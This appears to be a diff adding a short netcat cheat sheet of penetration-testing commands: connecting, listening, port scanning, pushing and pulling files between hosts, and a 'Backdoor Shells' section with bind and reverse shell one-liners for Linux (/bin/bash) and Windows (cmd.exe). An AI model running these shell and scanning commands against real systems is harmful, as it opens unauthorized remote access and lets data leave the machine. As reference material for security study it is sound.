@@ -1,0 +1,40 @@
+# Author - Eoin Finney
+# Reference: http://nc110.sourceforge.net/
+
+## Netcat things
+
+## Connect to machine on port
+nc [TargetIP] [port]
+
+## Start a Listener
+nc -l -p [port]
+
+## TCP Port Scanner on range [startport] to [endport]
+nc -v -n -z -w1 [targetIP] [startport>-<endport]
+
+==========
+
+## File Transfers
+
+### Get from listener
+nc -l -p [port] < [filename]
+nc -w3 [targetIP] [port] > [filename]
+
+### Push to listener
+nc -l -p [port] > [filename]
+nc -w3 [targetIP] [port] < [filename]
+
+==========
+
+## Backdoor Shells
+### Linux Shell
+nc -l -p [port] -e /bin/bash
+
+### Linux Reverse Shell
+nc [localIP] [port] -e /bin/bash
+
+### Windows Shell
+nc -l -p [port] -e cmd.exe
+
+### Windows Reverse Shell
+nc [localIP] [port] -e cmd.exe
